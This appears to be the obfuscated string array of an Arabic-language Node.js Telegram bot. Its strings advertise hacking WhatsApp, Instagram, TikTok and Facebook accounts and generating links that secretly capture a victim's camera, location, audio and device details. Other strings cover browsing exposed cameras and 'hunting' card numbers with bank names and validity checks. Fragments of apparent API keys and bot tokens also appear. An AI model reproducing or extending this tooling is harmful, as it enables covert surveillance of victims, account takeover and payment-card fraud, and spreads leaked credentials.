        'Dwllz',
        'firstName',
        'بنما\x20🇵🇦',
        'ل\x20مره\x20اخرى',
        'تصفير\x20الذا',
        'EpoVD',
        'whatsapp.c',
        ':*\x20',
        'لقد\x20تم\x20وصو',
        '.\x20استخدم\x20ا',
        'resource_r',
        'YRsLQ',
        'OrBcv',
        'الدعوة',
        'vqYrW',
        'ukALQ',
        'لام',
        '🇳🇮',
        'تلقائيًا.',
        'twXHo',
        'et=UTF-8',
        '9727',
        'حاولة\x20مرة\x20',
        'الآن\x20أرسل\x20',
        'qtOfi',
        'info/json/',
        'تم\x20تجاهل\x20ض',
        'ظر\x20عن\x20رقمي',
        'WEKRb',
        'بك\x20فقط.',
        'iEjvb',
        'الصين',
        'لقد\x20قمت\x20بط',
        '1.api.radi',
        'الأردن\x20🇯🇴',
        'tPlha',
        'SCqBp',
        'q.whatsapp',
        'bpvGJ',
        'videos',
        'LVyLv',
        'Ymirj',
        'xt...',
        '\x20وفتحها\x20مج',
        'Android\x2010',
        'uest',
        'eQrut',
        'RWkDy',
        'GGBIB',
        'gALvA',
        'فنزويلا\x20🇻🇪',
        'TRHEi',
        '🚫\x20تم\x20منع\x20إ',
        'ource_url=',
        '▓▓▓▓░░░░░░',
        'اكتب\x20لي\x20رس',
        'countryNam',
        'sponsivevo',
        '\x20محظور\x20بال',
        'ygOki',
        'ZGNqw',
        'تم\x20اختراق\x20',
        's\x20for\x20chat',
        'BHKhRoiSKl',
        'منتهى\x20قم\x20ف',
        '.row.messa',
        '❌\x20لا',
        'البوت\x20أصبح',
        'imrXj',
        'sendFile',
        '\x20مهمه\x20اذا\x20',
        'naHHV',
        'network',
        'ابن\x20سيرين',
        'بلغاريا\x20🇧🇬',
        'TWJGv',
        '🇪🇸',
        'المزيد\x20من\x20',
        'HtkOX',
        'FAyUE',
        'للحصول\x20على',
        'efVQI',
        '\x20📡\x0a-\x20الوقت',
        'ا\x20الامر\x20/V',
        'ERROy',
        'hing\x20radio',
        'nmTIc',
        'ر\x20مجاناً:',
        'كامرات\x20في\x20',
        'ول\x20إلى\x2030\x20',
        'uXwVx',
        'فلسطين\x20🇵🇸',
        'countries_',
        'zUfzk',
        'YSyzV',
        '\x20الرسالة.\x20',
        'deleteMess',
        'لا\x20يمكنك\x20ا',
        'اختراق\x20تيك',
        '/r/?chatId',
        's24.me/en/',
        'Clddb',
        'من\x20أنك\x20لست',
        'Qv74P2QNTE',
        'ريونيون\x20🇷🇪',
        'array',
        '🇩🇪',
        'ي:\x20',
        'ZgPNh',
        'qlSrW',
        '`\x0a*[-]\x20Ban',
        'إستونيا\x20🇪🇪',
        'RpHSR',
        'zoqwC',
        '7oxkoPuxqz',
        'mlDhC',
        'IPjek',
        '4uXnqSV',
        'orig',
        'RBOOH',
        'me/+HcYt6D',
        'أرمينيا\x20🇦🇲',
        '🇳🇱',
        'zrEKc',
        '\x0a📝\x20اسم\x20الم',
        'otos.clari',
        'IIRRRAAJAX',
        'ages?n=',
        'h.me/',
        'content',
        'bqRTg',
        'لقد\x20تم\x20اخت',
        'kHKaU',
        'e\x20Visa!*',
        'Wells\x20Farg',
        'رقم',
        'SkXFF',
        'bio',
        'NaN',
        'الرجاء\x20إدخ',
        'https://nm',
        'علومات\x20الج',
        'JFxrW',
        'ى\x20صورة\x20الم',
        'Njlhe',
        't?start=',
        'uPjSF',
        '▓▓░░░░░░░░',
        '.insecam.o',
        'cqMjD',
        'RWEvi',
        'chat',
        'PRkwo',
        'السلفادور\x20',
        '/webp,imag',
        'اختر\x20مصدر\x20',
        'ram-bot-ap',
        'تم\x20لغيم\x20ال',
        'findIndex',
        'chHyo',
        '🙋‍♂️\x20الصورة\x20',
        'index',
        'temp_video',
        'nJlNI',
        'XUKlT',
        'ة\x20الاشتراك',
        'v0PamCYCXz',
        '/k.html?ch',
        'uUGdX',
        'convert_te',
        'يات\x0aتصاميم',
        'Dxjhj',
        'تركمانستان',
        'KKKKEEEE',
        'uuid',
        'dzZUJ',
        '➖\x20الدوله\x20:',
        'HqLeg',
        'k.glitch.m',
        'عوة',
        'NiHIk',
        'https',
        'المستخدم\x20',
        'dyoOf',
        '\x20الموقع:',
        'آمن\x20🟢',
        'GdFWU',
        'RLPhs',
        'wjehu',
        'AMBXR',
        'ليتوانيا\x20🇱🇹',
        'gpt-3.5-tu',
        'timers',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'XXXFFFLlHH',
        'ات\x20المحجوز',
        'تحويل\x20النص',
        'coolnames.',
        'الإمارات\x20🇦🇪',
        'chatId',
        'lIeEr',
        'bluetoothS',
        'لم\x20تفتح\x20ال',
        'لبت\x20باسورد',
        'القناة\x20الت',
        'د\x20الأنوية:',
        'app/index.',
        '=\x0a[-]\x20by\x20:',
        'PHaFS',
        'get_joke',
        'لمعلومات:\x20',
        'موريتانيا\x20',
        'exit',
        'معرفة\x20رقم\x20',
        'hQNCN',
        'iBqfs',
        'fe.html',
        'toLocaleTi',
        'فك\x20حظر\x20مست',
        '🇰🇲',
        'body-parse',
        'زرار.\x20راسل',
        'wBkdl',
        'linkId',
        'lsPpj',
        'ata:',
        'answerCall',
        'ميع\x20أي\x20نقا',
        'bgdup',
        'base64',
        'LrESv',
        'j1u7p1lXXG',
        '_pins/?q=',
        'الصوره\x20',
        'لحذر\x20مع\x20ال',
        'MSFsJ',
        'ynthesize',
        'تفسير\x20الأح',
        'PNC\x20Bank',
        'ير\x20chatId\x20',
        '\x20ملف\x20🔒',
        'uoVDv',
        'غوام\x20🇬🇺',
        'أهلاً\x20بك!\x20',
        'mKHDz',
        'تسجيل\x20صوتي',
        'عزيزي\x20حمود',
        'trim',
        'VRHWw',
        'message:',
        'MECrO',
        '**\x0a-\x20الدول',
        'بوركينا\x20فا',
        'دفوع.',
        'sgubK',
        '/imageRece',
        'اله\x20طويله\x20',
        'map',
        'OwDMk',
        '➖\x20تاريج\x20ال',
        'QWbtu',
        'FWXij',
        'SYXQa',
        '\x20🔒',
        'ZjGUP',
        'kyTtB',
        'W5B7mU',
        'ycountryco',
        'NpFto',
        'JKZXp',
        'startsWith',
        'generate_i',
        '/submitVid',
        '🚀\x20صيد\x20يوزر',
        '\x20🔒\x0a-\x20نطاق\x20',
        'FDkbP',
        '228951mLuSrT',
        'لروابط',
        'bNXui',
        'ybuag',
        'LIHSY',
        ':\x20`',
        'gDXnx',
        'XeveB',
        'سجيل\x20صوتي',
        '\x20الأرقام:',
        'يذ\x20/start:',
        'ن\x20النت\x20قوي',
        '.me/',
        'ت\x20الجهاز\x20🔬',
        'عندما\x20تصل\x20',
        '➖\x20الدولة\x20:',
        'VfoMH',
        'ySLpC',
        'تم\x20انشاء\x20ر',
        'يس\x20اسمي',
        'ق\x20الهاتف\x20ك',
        'GhhCK',
        'فرنسا\x20🇫🇷',
        'SYPZQ',
        'https://ar',
        'nwEHH',
        'SbLlz',
        'hing\x20love\x20',
        'ألبانيا\x20🇦🇱',
        '🇰🇿',
        'ion/xml;q=',
        'تم\x20اكتشاف\x20',
        'vJOGF',
        'http://www',
        'XmbKk',
        'videoData',
        'فنلندا',
        'internalSt',
        'في\x20الطلب.',
        'gfllU',
        'JwODy',
        'uery',
        'SGulY',
        'uhInk',
        'رواندا\x20🇷🇼',
        'backQuery',
        'path',
        'org',
        'mPoxo',
        'ر\x20لتوليد\x20ر',
        'oTOnV',
        'BsVyH',
        'ابط\x20التقاط',
        '\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20',
        'ه\x20إلى\x20صوت\x20',
        'بك!\x20وحصلت\x20',
        'المكسيك\x20🇲🇽',
        'user',
        '/ca.html',
        'اختراق\x20انس',
        'answer_1',
        '░]\x2025%',
        'base64-js',
        'hex',
        'بـ\x20Pintere',
        '\x20⏰\x0a-\x20اسم\x20ا',
        'qSMKL',
        '📞\x20إرسال\x20جه',
        'فرنسا',
        'ولة\x20الحصول',
        'JLZBL',
        'JQIsD',
        'اختراق\x20فري',
        'ftKGd',
        'ge_details',
        'dIGEOjpMgZ',
        'TJCXD',
        'تفسير\x20حلم\x20',
        'ياء\x20🧠',
        'QulEd',
        'NfLAH',
        'ية\x20عبر\x20راب',
        '*Hi\x20Bro,\x20I',
        '\x20⚡\x0a-\x20الشبك',
        'لزر\x20لفحص\x20ا',
        'آيسلندا\x20🇮🇸',
        'الحصول_على',
        'HAgNI',
        'رقم\x20الهاتف',
        'username',
        '\x20الذكاء\x20ال',
        'ROQnT',
        'جعلته\x20مشبو',
        'tgme_usern',
        'sRXgs',
        '/getNameFo',
        '\x20🔞',
        'uCTPX',
        '\x20🎨\x0a-\x20تاريخ',
        'ناء\x20جلب\x20مع',
        'مرحبا!\x20في\x20',
        'تنزانيا\x20🇹🇿',
        'يا\x20🇿🇦',
        'ود\x20هاذا\x20ال',
        'receive-sm',
        '➖\x20اضغط\x20ع\x20ا',
        'pCcLe',
        '\x20📶\x20(سرعة:\x20',
        'bJDHu',
        '🇩🇰',
        'uery\x22:\x22',
        'كوريا\x20الجن',
        'qeyHH',
        'KhaME',
        'مستخدم\x20لإض',
        'ي\x20ع\x20الكثير',
        'ل\x20وهمي\x20💌',
        'inviteLink',
        'HeKEv',
        'غيرنزي\x20🇬🇬',
        '\x20الجهاز:\x20',
        'ZowoD',
        'من\x20القائمة',
        'lmDog',
        '\x20الرجاء\x20تغ',
        'إرسال_رسال',
        'hotos:\x20',
        'add',
        '🇮🇩',
        '\x20في\x20جهاز\x20ا',
        '0.9,image/',
        'وبية\x20🇰🇷',
        'اشترك\x20في\x20',
        'gcJXe',
        'ni:',
        'waiting_fo',
        'repeat',
        'onText',
        't-break',
        'النمسا\x20🇦🇹',
        'No\x20visa\x20da',
        '&duration=',
        'كينيا\x20🇰🇪',
        '\x20زخرفته.',
        'sYvXq',
        '\x20الحساب:*\x0a',
        'بيرو\x20🇵🇪',
        'رابط\x20جمع\x20ا',
        'colorDepth',
        'ي\x20تريد\x20إزا',
        'لبنان',
        'mbavs',
        'eed\x22:true,',
        'قر\x20على\x20الر',
        'المشاهده\x20ع',
        'kxkmi',
        'iZyyT',
        'تم\x20حظر\x20الم',
        'ث\x20عن\x20صور.\x0a',
        'NLShY',
        'النمسا',
        'جهازك\x20او\x20ط',
        'ور\x20الهاتف\x20',
        'oOVTO',
        '/ca/?chatI',
        'ate_chat',
        'مع\x20الشخص\x20ا',
        'ط\x20حتى\x20الآن',
        'شبه\x20ثلاثية',
        '\x20نظام\x20التش',
        'اق\x20وتساب\x0a:',
        'NnIiU',
        'facebook.c',
        'KeJog',
        'تم\x20حذف\x20الم',
        'recordAudi',
        'kJhRe',
        '\x20IP:\x20',
        'tions\x22:{\x22q',
        'IUwhh',
        'link',
        'lbYOa',
        'وة\x20امانها\x20',
        'YHTXL',
        'rious-crep',
        'للمسية:\x20',
        'cIVnR',
        'ات\x20المدفوع',
        'd\x20Type\x20:*\x20',
        '/capture',
        'ko)\x20Chrome',
        'randomByte',
        'XoiHY',
        '🎮\x20ابدأ\x20الل',
        '5187343GbdGvN',
        '/search/my',
        'تة.',
        '%\x20🔋\x0a-\x20هل\x20ا',
        'name_propo',
        'gram',
        'RXovo',
        'slice',
        'لرابط\x20ملاح',
        'مطور.',
        'نامج\x20وحذف\x20',
        '📤\x20صورة\x20تمت',
        'لاتفيا',
        'last_name',
        'CgyuY',
        'جزر\x20كايمان',
        'لام\x20🧙‍♂️',
        '\x20الرقم\x20لنس',
        'السنغال\x20🇸🇳',
        'photos',
        '*[-]\x20Card\x20',
        'default-im',
        ':AAHzUQvAA',
        'sXstp',
        'CwMWn',
        'الصين\x20🇨🇳',
        'fYUiR',
        'غير\x20معروف',
        'ت\x20المدفوعة',
        'صربيا\x20🇷🇸',
        ']\x200%',
        'تم\x20إرسال\x20م',
        'xvPSK',
        'XfXnY',
        '.mb-3',
        '\x20الصور',
        'بواسطة\x20الذ',
        'SUZXq',
        'راقبه.....',
        'get_number',
        'تجميع\x20النق',
        'ابط\x20دعوة.',
        '\x27);',
        'GaYGC',
        'YAdcH',
        'rabat',
        'Generating',
        'ضحيه\x20في\x20اد',
        'yApOF',
        'أرسل\x20لي\x20اا',
        '\x20:\x20@',
        '\x20📱\x0a-\x20الذاك',
        'بولندا\x20🇵🇱',
        'بانه\x20مشبوه',
        '/getLocati',
        'وله\x20بسبب\x20ق',
        'ation',
        '😁.',
        'cuKiP',
        'ط\x20🪄',
        'CMeit',
        'GkhLr',
        'toAkk',
        'امريكا\x20🇺🇸',
        'dpaMQ',
        'meString',
        'بوليفيا\x20🇧🇴',
        'urce/BaseS',
        'essing\x20vid',
        'ًا\x20',
        'اتف\x20كاملاً',
        'إسبانيا\x20🇪🇸',
        'ت\x20إلى\x20مدفو',
        'إثيوبيا\x20🇪🇹',
        '\x20\x22https\x22.',
        'me/+oo7CRq',
        ',\x20\x27',
        'eech',
        '🇫🇮',
        '📸\x20الصورة\x20',
        'r.html',
        'yxnnY',
        '00%',
        'لعبة\x20المار',
        'ccurred:',
        'child_proc',
        'qROpj',
        'quad',
        '▓░░░░░░]\x205',
        '➖\x20وقت\x20الان',
        '/captureFr',
        'tIvLM',
        'ت\x20تلقائيًا',
        'readdirSyn',
        'ذاكرة\x20المؤ',
        'لا\x20توجد\x20رس',
        'كل\x20صحيح.',
        ';q=0.8,app',
        'اب\x20لفك\x20الح',
        '\x20•\x20مزود\x20ال',
        'VvtIA',
        '🇲🇾',
        '\x20الجهاز',
        'GHnVY2MmIy',
        'imageDatas',
        'whLhz',
        'stream',
        'lekYy',
        'مله\x20ارسلها',
        'uIQty',
        'لب\x20بحث\x20بال',
        '\x20دخول\x20شخص\x20',
        'paqrg',
        'غط\x20زر\x20قديم',
        'لمتصفح:\x20',
        '🇱🇺',
        '\x20فاير',
        'لإذاعة\x20إلى',
        'listen',
        'https://sm',
        'ExJYb',
        'لقد\x20قام\x20ال',
        'HHsme',
        '.responsiv',
        'bzBTx',
        'هاز\x20بنجاح',
        '224AaDTCQ',
        'wgsGT',
        'ها\x20رقمي\x20ول',
        'NbiyL',
        'nel',
        'noIZJ',
        'on/:linkId',
        'ال\x20معلومات',
        '▓]\x20100%',
        'تم\x20الانتها',
        'فحص\x20الرابط',
        'ntry\x20:*\x20`',
        'location.h',
        'choose_typ',
        'لومات\x20المس',
        'ءة\x20ملف\x20الق',
        'wyUhg',
        'خول\x20لرابط\x20',
        'replit',
        'line/cool.',
        'VTzzr',
        'حقق\x20من\x20جهة',
        'fmyyy',
        'أنغولا\x20🇦🇴',
        '/submitLoc',
        'iEeTf',
        '\x0a📱\x20**معلوم',
        'memory',
        '\x20لجميع\x20الم',
        'رى\x20لاحقًا.',
        'الدنمارك',
        '8435401492',
        'ibn_sirin',
        'لجة\x20callba',
        'state',
        '🇬🇹',
        'بليز\x20🇧🇿',
        'إضافة\x20مستخ',
        'oCiAo',
        'STWqf',
        'طلب_الكود_',
        'بحث\x20عن\x20صور',
        'answer_2',
        'existsSync',
        'false',
        'اب\x0aافتيارا',
        'EgxgO',
        'html',
        'لشاشة:\x20',
        'UIqLj',
        'Bpmyo',
        'توغو\x20🇹🇬',
        'بوت\x20اختراق',
        'رة\x20(RAM):\x20',
        '🇨🇳',
        'JldBU',
        'hdnfZ',
        'الخادم\x20يعم',
        'sRbqQ',
        'eJDSE',
        'otocol',
        'EXEYa',
        'ف\x20\x20رساله\x20ج',
        'الكثير\x20من\x20',
        'صورة.',
        'cpBsP',
        '🇵🇹',
        '=0.9,en-US',
        '\x20من\x20الخورز',
        'Rxssr1tFaU',
        'An\x20error\x20o',
        'de_',
        'country',
        'TQCqBlZWFk',
        'VXbVV',
        'tgtUI',
        'clck',
        '.\x0ahttps://',
        'WhYAw',
        'com/chat/o',
        'get_link_',
        'hzYWK',
        'الهند\x20🇮🇳',
        'jKhsD',
        'eo:',
        'sing\x20chatI',
        'قناة1',
        'ه\x20لنه\x20يحتو',
        'طات\x20متاحة\x20',
        'YJIcKlujfP',
        ']\x2075%',
        '\x20الكثير\x20من',
        '/F.html?ch',
        'شاء\x20⏰\x20:\x20',
        '\x0a📸\x20الصورة\x20',
        'قبة\x20📡',
        'لف\x20المؤقت\x20',
        'kjJqg',
        'FXqJD',
        '\x0a\x0aاضغط\x20على',
        'WebKit/537',
        'لضحيه\x0a:\x20',
        'يراد\x20الأرق',
        'TWDje',
        'qavTf',
        'onne-45c7e',
        'ed.',
        'wyiyd',
        'xOTTW',
        'RTvnG',
        'Alagt',
        'ror',
        'geolocatio',
        'JWlhD',
        'م\x20للمطور:',
        'م\x20في\x20طلب\x20ك',
        'nnel',
        'QovKh',
        'max-age=0',
        'MuAYF',
        'LsdKOM',
        'افته\x20كـ\x20VI',
        'aThHadlLGB',
        'vtZbr',
        'ود\x20🇲🇪',
        'الصورة:',
        'iypEp',
        '\x20النكتة.\x20ا',
        'ابه\x20تلجرام',
        'لذي\x20تريد\x20ح',
        '🇺🇿',
        'rce/get/?s',
        'hhcuG',
        '\x20المميزات\x20',
        'buffer',
        'لديك\x20حاليً',
        'ر\x20عن\x20المست',
        'ت\x20بنات\x0aخلف',
        'env',
        '/record/:l',
        'stations/b',
        'vRNAS',
        '/b/?chatId',
        '\x20جميع\x20المش',
        'جاري\x20اخترا',
        'ستخدم:\x20',
        'xzGpN',
        'com',
        'أذربيجان\x20🇦🇿',
        'حظورين:',
        'إندونيسيا',
        'rqxZx',
        '\x20الضحية\x20عب',
        'ه\x20بواسطة\x20ت',
        '🇫🇷',
        'Error\x20occu',
        'sendVideo',
        'pwALh',
        'جلد:\x20',
        '\x20آخر\x20تحديث',
        'قتة:',
        'IWLGs',
        'error',
        'IKwRA',
        'ابط\x20قم\x20في\x20',
        'rTSSF',
        'RFVwM',
        'نكتة',
        'ejection',
        'VHFrF',
        'TREne',
        'ساحل\x20العاج',
        'بطًا\x20يبدأ\x20',
        '(\x27signatur',
        '\x20\x0aكلمة\x20الس',
        'تم\x20استخدام',
        'VISA\x20-\x20DEB',
        'rshq_faceb',
        '+7KZ',
        'Bank\x20of\x20Am',
        'xQubt',
        'acKaN',
        '1kNNPU6RVm',
        'FCHlE',
        'ه\x20بنسبه\x20لن',
        'SOKWI',
        'nmKrp',
        'ruPtS',
        'params',
        'multer',
        '.\x20يمكنك\x20تج',
        'الجبل\x20الأس',
        'اديو',
        '؟:\x20',
        'https://ap',
        'VeAWQ',
        'ormalize_f',
        'ام\x20بنجاح.',
        'إضافة\x20أسما',
        'oURpJ',
        'لرابط:\x20',
        'البرازيل\x20',
        '\x20اي\x20صوره\x20ف',
        'lastUpdate',
        'step',
        'age.jpg',
        'اليونان\x20🇬🇷',
        '\x20جهة\x20الاتص',
        'HqhWB',
        'wxWwm',
        'ليبيا\x20🇱🇾',
        'تصال:\x20',
        'luETa',
        'l.ltr.gree',
        'DzvmP',
        'لوبة\x20غير\x20م',
        'r\x20data\x20for',
        'VQXBh',
        'KejMD',
        '\x20الأرقام:\x20',
        '-100205070',
        'o-browser.',
        'jiZxj',
        'PLcun',
        'avif,image',
        'اك\x20VIP',
        'yNCfB',
        'حدث\x20خطاء\x20❌',
        'WzoRk',
        'كاليدونيا\x20',
        'أسماء\x20المس',
        'splice',
        'https://cu',
        'EerwN',
        'TzjIy',
        'سريلانكا\x20🇱🇰',
        'جرب\x20دوله\x20م',
        '/xx.html?c',
        'SIGTERM',
        'e\x27,\x20\x27',
        'nCuVl',
        'IMYPk',
        'تلجرام\x20🪝',
        'sUQyh',
        'ول\x20اليه\x20ال',
        'jNkht',
        'ice.org/',
        'اختراق\x20فيس',
        'holder.tex',
        'صيد\x20فيزات\x20',
        '░]\x2075%',
        'vNkHP',
        'nKkqo',
        'ins\x22}}',
        'ZutSr',
        'hWgmn',
        'UZaIC',
        'swoeO',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'رقم\x20في\x20وتس',
        'nAyCJ',
        'me/lTV_l/3',
        'خاص\x20بك\x0aعند',
        'سايل\x20الضحي',
        'ختيار\x20نوع\x20',
        'uKtJs',
        'ل\x20متاحة.',
        'ناء\x20إرسال\x20',
        'PvEsM',
        'لهاتف:\x20',
        'دم\x20VIP',
        'laIVO',
        'البحث\x20عن\x20ص',
        'الناتج:\x20',
        'length',
        'ZcDLQ',
        'Please\x20con',
        '0\x20(Windows',
        'toISOStrin',
        'لا\x20توجد\x20دو',
        'حدث\x20خطأ\x20أث',
        'kwMRv',
        'oydCz',
        'ط\x20🔒',
        '\x20اشتراك\x20إج',
        'ًا.',
        'ت\x20الجهاز',
        'يرات\x20المرا',
        '\x20📜\x0a-\x20نوع\x20ا',
        'البرتغال\x20🇵🇹',
        'تغير\x20الرقم',
        't.html',
        'heUam',
        'ر\x20أدناه\x20لا',
        'Number\x20:*\x20',
        'yNfCl',
        'tLtiN',
        'اقع\x20💣',
        'rification',
        'HFUCY',
        'process\x20vi',
        'QZzpF',
        '\x22,\x22redux_n',
        'VEptk',
        'ukqIW',
        'أرسل\x20حلمك\x20',
        'Aquza',
        'خطأ\x20في\x20جلب',
        'unhandledR',
        'eIiWp',
        'Afpcf',
        'd\x20or\x20video',
        'tml',
        'upjSa',
        'STUml',
        'سحب\x20جميع\x20ر',
        'البرتغال',
        'SxZVB',
        'رف\x20المدخل.',
        'فذ\x20',
        'get_love_m',
        'ca.html',
        'ess',
        'unbanUser',
        'qkbAE',
        'keys',
        'السودان\x20🇸🇩',
        'لمراقبة\x20📡',
        'ook',
        'JUGLc',
        '\x20سوف\x20تحصل\x20',
        'hDPbA',
        'ync',
        'يرجى\x20إرسال',
        'crypto',
        'qQNgP',
        'الذي\x20يمكن\x20',
        'son',
        'RqUIF',
        '🇦🇿',
        'ضغط\x20على\x20هذ',
        '🇲🇷',
        'tctMn',
        'peg',
        'اق\x20موقع\x20ال',
        'then',
        'EBtjh',
        'حقق\x20من\x20اشت',
        '🇭🇰',
        'ded;\x20chars',
        'وقع\x20📍',
        'hZvXJ',
        'وفتح\x20الميز',
        'ديو\x20المتاح',
        'ي\x20في\x20لوحة\x20',
        '\x20🔁',
        'iXipG',
        'st.\x0a-\x20اضغط',
        'ojlxx',
        'ره\x20اخره',
        'CAmjN',
        'قطة\x20سيتم\x20ف',
        'IyVFW',
        'ت\x20مشاركته.',
        'SPMHZ',
        'لذي\x20تريد\x20ف',
        '✅\x20نعم',
        'صه\x20لمن\x20نجد',
        '`\x0a*[-]\x20Val',
        'لنظام:\x20',
        'pTbBA',
        'مرحبًا!\x20هذ',
        'LiLvJ',
        'rHgER',
        '\x20المحتله\x20🇮🇱',
        'وة\x20الامان\x20',
        'لف\x20الشخصي:',
        'lOsxr',
        'battery',
        'secondName',
        'seWwkhTzrZ',
        'networkSpe',
        'substring',
        'BDAzL',
        'EPRFa',
        'ي\x20راسك....',
        '\x20من',
        'اختر\x20دولة\x20',
        'signature',
        'ات\x20الجهاز:',
        'zCUJG',
        'NeGWy',
        'اختراق\x20سنا',
        'hatId=',
        'XLuXi',
        'الته\x20من\x20VI',
        '\x22scope\x22:\x22p',
        'er.glitch.',
        '\x20•\x20تفاصيل\x20',
        'يح\x20يبدأ\x20بـ',
        'age',
        'numbers/',
        'يوزرات\x20نوع',
        'لم\x20يتم\x20اخت',
        'stringify',
        'left',
        'اختراق\x20وات',
        'همي:',
        'sendPhoto',
        '-\x20نوع\x20الات',
        'bannedUser',
        'kaSip',
        'time',
        'total_coun',
        'UWkcD',
        'BpaKE',
        'لعبة\x20الأذك',
        'ton\x20below\x20',
        '*\x0a\x0a',
        'ar-SA',
        'EUpmM',
        'تم\x20استقبال',
        'phoneNumbe',
        'لة\x20🌏\x20:\x20',
        'sion',
        'final_stat',
        '▓▓▓░░░░]\x207',
        'kWBzm',
        '\x20أسماء\x20الم',
        '🇷🇸',
        'تم\x20التحقق\x20',
        'ط\x20خمس\x20مرات',
        'YHEZW',
        'RvQKy',
        'FmbCt',
        'xception:',
        'ecfnL',
        '/124.0.0.0',
        'utu.be',
        'lstatSync',
        'ice.glitch',
        'IezJP',
        '\x20هذا\x20الراب',
        'غط\x20على\x20الز',
        '\x20البرامجيا',
        'تف\x20☎️\x20:\x20`',
        'ybtZP',
        'node-fetch',
        'المؤقت:',
        'لرقم\x20لنسخه',
        'networkTyp',
        'دولة\x20غير\x20م',
        'الملف\x20الشخ',
        'fQQZA',
        'ysIVa',
        'readFileSy',
        '\x20الرسائل:',
        'zNfYE',
        'boid-outst',
        'امرا\x20الأما',
        'HhaDo',
        'ور\x20ابحث\x20عن',
        'اولة\x20مرة\x20أ',
        'quest:\x20Mis',
        'answer',
        '/captureBa',
        'text',
        '?start=',
        'tlgKx',
        'atsandbox.',
        'خطأ\x20في\x20تنف',
        'lIlaR',
        '🇱🇻',
        '\x20صورة\x20🔒',
        'cmCTJ',
        'xZGnX',
        'valid',
        'esqlb',
        'ZcghG',
        'EliQo',
        '[▓▓▓▓▓▓░░░',
        '\x20نهائية:\x20',
        'aLgev',
        'الفلبين\x20',
        'load',
        '/record/',
        'أثناء\x20إعدا',
        'nt:',
        'ه\x20يمنيه\x20قص',
        'qEKfT',
        'اختراق\x20اله',
        'ال\x20الخاصة\x20',
        'nvELL',
        'com/game#',
        'i.openai.c',
        '2BT3BlbkFJ',
        'ستخدام\x20الأ',
        'HUZFy',
        'خطير\x20جداً\x20',
        'toString',
        'غواتيمالا\x20',
        'ية\x20تحديد\x20ا',
        'يرين:',
        'لم\x20يتم\x20است',
        '*\x20[BOT](t.',
        '\x20على\x20صورة\x20',
        'اب\x20سريعاً\x0a',
        'ذا\x20الرابط\x20',
        'gender',
        'لزر\x20لبدء\x20ص',
        'ي\x20كلمة\x20الب',
        'DLmpW',
        'mzkhO',
        'YFrgV',
        '\x20Chrome/11',
        'random',
        'FWghM',
        'en-US,en;q',
        '\x20و\x20الحذر\x20م',
        'لانتهاء.',
        'Received\x20p',
        'choices',
        'إزالة\x20قناة',
        'question',
        'flsLf',
        'UHNTV',
        'isDirector',
        'UMCkk',
        '7065665133',
        '/so',
        'ge.setItem',
        'psdtq',
        'السويد\x20🇸🇪',
        'خدم',
        'LjMBd',
        'yochM',
        'audio.html',
        'zCypQ',
        'لزر\x20لتزخرف',
        '\x20اي\x20برمجيا',
        'ماكاو\x20🇲🇴',
        'ك\x20حظره:',
        'NhFtx',
        'ة...',
        'Vabgl',
        'السؤال:\x20',
        '/ge',
        'ي\x20تلغيم\x20را',
        't.me',
        'بلجيكا\x20🇧🇪',
        '➖\x20رمز\x20الدو',
        'MXFeE',
        'لإحصائيات\x20',
        'sTLVB',
        'كرة\x20المؤقت',
        'OjOaL',
        'qqknQ',
        '\x20•\x20معلومات',
        'number',
        ',\x20like\x20Gec',
        'get',
        'لذي\x20رسلك\x20ه',
        'DePPa',
        'RfqvS',
        'وقت_الإنشا',
        'includes',
        '\x0aانمي\x0aوالم',
        'ل:\x20',
        'بصوت\x20',
        '/recordAud',
        'خطأ:\x20chatI',
        'خطأ\x20في\x20معا',
        'earchResou',
        '\x27m*\x20[™](t.',
        'vnOQE',
        'م\x20هذا\x20هو\x0a:',
        'concat',
        'instagram',
        'RBZqH',
        'NtDuu',
        'مك\x20المنحرف',
        'me/',
        'arraybuffe',
        'لأمر\x20/free',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'بوتسوانا\x20🇧🇼',
        '\x20إلى\x20صوت\x20🔄',
        'BCqaX',
        'CLASSIC',
        '\x20🔻\x0a-\x20المدي',
        'text/html,',
        'hing\x20joke:',
        'خل\x20إلى\x20الر',
        'لوكسمبورغ\x20',
        'uNYgq',
        '9916',
        'RHweA',
        '\x20كاميرات\x20ا',
        'للعبة\x20باست',
        'zynwb',
        'uxKuf',
        '/s.html?ch',
        '_رقم',
        'PQbSf',
        'TgBpH',
        'form-data',
        'YTflO',
        'PPiad',
        'ليوزرات:',
        'NzIrN',
        'zmWxE2TkNh',
        'RsQCB',
        'aFRTU',
        'wfBKf',
        'addChannel',
        'jEfMZ',
        'iYlht',
        '░░░░░░░]\x202',
        'bDsfk',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'sendLocati',
        'كرواتيا\x20🇭🇷',
        'تركيا\x20🇹🇷',
        'request_co',
        'ezZjQ',
        'جنوب\x20أفريق',
        'اطك.',
        'unlink',
        'SpZeL',
        '➖\x20المنصه\x20🔮',
        'ظه\x20بزم\x20يكو',
        'https://ww',
        '\x20محطات\x20الر',
        'جزر\x20القمر\x20',
        'مصر\x20🇪🇬',
        'IBhAd',
        'بنجاح\x20✅',
        'urlencoded',
        'تشيلي\x20🇨🇱',
        'MDBiL',
        'orage',
        'wayLr',
        'ojInm',
        'rshq_insta',
        'RgMEE',
        'حظر\x20مستخدم',
        'ئعة\x20مثل\x20\x0aا',
        'NRAgm',
        'neNumber',
        '\x20لتقنية\x20ال',
        'ناة\x20الاشتر',
        'أستراليا\x20',
        'QVDgI',
        'forEach',
        'RRhAi',
        'url',
        'ojIAq',
        'request_ve',
        'اعطني\x20نكتة',
        'سوريا\x20🇸🇾',
        'اج\x20إلى\x20',
        'الضحيه\x20🎤\x20',
        'سويسرا\x20🇨🇭',
        'OKaGP',
        '0.00000',
        'Bbdec',
        'fetch\x20visa',
        'فنلندا\x20🇫🇮',
        'ت\x20الخبيثه\x20',
        'WgNBo',
        'النهائية:',
        ';\x20K)\x20Apple',
        'إندونيسيا\x20',
        'مشبوه\x20🟠',
        'التمتع\x20في\x20',
        'vXJCk',
        'countryCod',
        'شتركين:',
        'LYTeS',
        '/ios',
        'InIYF',
        'SYhnS',
        'رابط\x20تجميع',
        'رومانيا\x20🇷🇴',
        'طناعي:',
        'start_priv',
        'أوروغواي\x20🇺🇾',
        'تم\x20تسجيل\x20ص',
        'applicatio',
        ':\x20\x0a\x20اليوزر',
        'hUJEY',
        'b.html',
